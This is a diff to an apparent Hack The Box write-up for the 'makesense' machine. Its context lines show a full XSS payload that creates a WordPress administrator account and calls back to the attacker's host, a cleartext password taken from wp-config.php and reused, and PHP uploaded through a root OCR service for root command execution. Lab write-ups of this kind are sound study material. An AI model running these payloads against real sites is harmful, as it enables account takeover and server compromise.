@@ -71,7 +71,6 @@ PORT    STATE SERVICE  REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
-
 {:filename="nmap.txt"}
 
 ## 443 - Wordpress Website
@@ -104,7 +103,6 @@ Clear. Light. Nice.
 Smooth. 4. 9. 2. 3. 
 
 ```
-
 {:filename="Jake Transcription.txt"}
 
 We get a transcription of `Jake`'s password, playing around with a few variations we get a login as `jake`
@@ -121,7 +119,6 @@ Limited due to `https` and `httponly cookies` I had an `LLM` write a payload to 
 <img src=x onerror='fetch("/wp-admin/user-new.php",{credentials:"include"}).then(r=>r.text()).then(h=>{let n=h.match(/name="_wpnonce_create-user" value="([^"]+)"/)[1];fetch("/wp-admin/user-new.php",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:`action=createuser&_wpnonce_create-user=${n}&user_login=w1ld&email=w1ld@x.io&pass1=Password123!&pass2=Password123!&pass1-text=Password123!&role=administrator&createuser=Add+New+User`})}).then(x=>fetch("http://10.10.14.3/Executed"))' />
 
 ```
-
 {:filename="payload.js"}
 
 I got a callback on my listener and am able to login as `w1ld`
@@ -136,13 +133,12 @@ This gets me a callback on my listener.
 
 ```bash
 www-data@makesense:/var/www/html/wp-admin$
-
 ```
+{:.filename="Shell as www-data"}
 
 ## Password Reuse to Walter
 
 taking a look at the `config` file we can find `walter`'s cleartext password.
-
 ```
 www-data@makesense:/var/www/html$ cat wp-config.php 
 <?php
@@ -176,8 +172,8 @@ if ( ! defined( 'ABSPATH' ) ) {
 
 define( 'WP_SQLITE_PLUGIN', true );
 require_once ABSPATH . 'wp-settings.php';
-
 ```
+{:.filename="Cleartext password"}
 
 Attempting to reuse this gets me a login as `walter`
 
@@ -211,8 +207,8 @@ Last login: Mon Jul 6 04:11:10 2026 from 10.10.14.3
 walter@makesense:~$ ls -lash user.txt
 4.0K -rw-r----- 1 root walter 33 Jul  5 15:48 user.txt
 
-
 ```
+{:.filename="Shell as walter"}
 
 There we can find the `user` flag.
 
@@ -226,6 +222,7 @@ Looking around we can find `root` running an `Optical Character Recognition` or 
 root        1416  0.0  0.7 228488 30176 ?        S    Jul05   0:03 php -S 127.0.0.1:8001 -t /root/ocr4/
 
 ```
+{:.filename="Root OCR service"}
 
 {:filename="root ocr.txt"}
 
@@ -251,9 +248,7 @@ Priority: u=0, i
 
 canvas_image=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAAfQAAADICAYAAAAeGRPoAAAQx0lEQVR4Xu3dS4hkVxkH8Jme7snMJMTEEAkazEJBomYhEiQoBkJAJC6jiAi68rERgqAuJiAk6EZEEF2JCCJoRtwIUfER0BBECAombqKiaDQTCEGT9Pvhd4bq8XZNT7rqVHXVuV%2F9GpqZ7t
 <SNIP>
-
 ```
-
 {:filename="image.post"}
 
 Which it then allows us to save as a file and it gets output to `saved/<filename.ext>`
@@ -270,6 +265,7 @@ We can then execute the `php` file to run commands as `root`
 ~/htb/makesense $ curl http://localhost:8001/saved/w1ld.php?c=whoami
 root
 ```
+{:.filename="Command execution as root"}
 
 We can grab a `root` shell.
 
